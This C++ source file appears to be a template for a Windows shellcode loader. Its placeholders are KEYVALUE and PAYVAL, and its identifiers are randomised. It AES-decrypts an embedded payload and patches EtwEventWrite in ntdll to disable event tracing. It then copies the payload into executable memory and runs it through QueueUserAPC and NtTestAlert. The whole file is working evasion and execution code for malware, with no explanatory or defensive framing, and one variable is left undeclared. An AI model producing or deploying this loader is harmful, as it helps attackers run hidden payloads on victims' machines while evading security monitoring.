#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "ntdll")

using Random6 = NTSTATUS(NTAPI*)();

int Random1(char * Random3, unsigned int Random3_len, char * Random2, size_t Random2len) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) Random2, (DWORD) Random2len, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) Random3, (DWORD *) &Random3_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}



int main()
{
	char Random2[]=KEYVALUE
	unsigned char Random3[]=PAYVAL

	unsigned int Random3_len = sizeof(Random3);
	void * addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
        VirtualProtect(addr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);

        #ifdef _WIN64
        memcpy(addr, "\x48\x33\xc0\xc3", 4);            
        #else
        memcpy(addr, "\x33\xc0\xc2\x14\x00", 5);                
        #endif  

        VirtualProtect(addr, 4096, oldprotect, &oldprotect);

	FreeConsole();
	Random6 Random7 = (Random6)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
	SIZE_T Random4 = sizeof(Random3);
	
	Random1((char *) Random3, Random3_len, Random2, sizeof(Random2));

	LPVOID Random5 = VirtualAlloc(NULL, Random4, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	WriteProcessMemory(GetCurrentProcess(), Random5, Random3, Random4, NULL);
	
	PTHREAD_START_ROUTINE Random8 = (PTHREAD_START_ROUTINE)Random5;
	QueueUserAPC((PAPCFUNC)Random8, GetCurrentThread(), NULL);
	Random7();

	return 0;
}
